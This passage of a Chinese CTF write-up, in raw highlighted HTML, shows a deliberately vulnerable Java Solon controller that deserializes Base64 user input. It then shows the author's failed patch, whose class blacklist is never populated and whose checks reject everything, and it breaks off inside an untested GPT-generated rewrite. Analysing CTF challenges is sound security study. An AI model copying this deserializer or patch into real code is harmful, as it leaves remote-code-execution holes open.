punctuation">&#123;</span>                    reader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/api"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Post</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">api</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Context</span> ctx<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> jsonObject<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span><span class="token class-name">DemoController</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> data<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">boolean</span> check <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">protected</span> <span class="token class-name">Class</span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> targetc <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> targetc<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一眼丁真漏洞点在反序列化上，还提供了<code>resolveClass</code>过滤，看了下依赖里面有个fastjson，不知道是不是打那个，反正我刚好没学这个（</p><h3 id="fix（Failed）"><a href="#fix（Failed）" class="headerlink" title="fix（Failed）"></a>fix（Failed）</h3><p>一点小问题：反编译的时候还反编译出了一个DemoController$1的类，但是IDEA识别不到，不知道怎么回事</p><p>尝试继续重写resolveClass</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>json<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Mapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Post</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">ModelAndView</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ModelAndView</span> model <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span><span class="token string">"freemarker.ftl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token string">"/api"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> model<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/*     * WARNING - Removed try catching itself - possible behaviour change.     */</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/log"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> filePath <span class="token operator">=</span> <span class="token string">"./logs/solon.log"</span><span class="token punctuation">;</span>        <span class="token class-name">BufferedReader</span> reader <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> line<span class="token punctuation">;</span>            reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">lineSeparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>reader <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    reader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/api"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Post</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">api</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Context</span> ctx<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> jsonObject<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span><span class="token class-name">DemoController</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> data<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">boolean</span> check <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">private</span> <span class="token class-name">ArrayList</span> <span class="token class-name">Blacklist</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Hashtable</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">HashSet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">TreeMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">protected</span> <span class="token class-name">Class</span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> targetc <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"commons.collections"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized"</span><span class="token punctuation">,</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson.JSON"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized"</span><span class="token punctuation">,</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"dont do this"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> targetc<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>赛后让gpt跑了一段，不知道能不能用：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedReader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileReader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectStreamClass</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>json<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Mapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Post</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">ModelAndView</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ModelAndView</span> model <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span><span class="token string">"freemarker.ftl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token 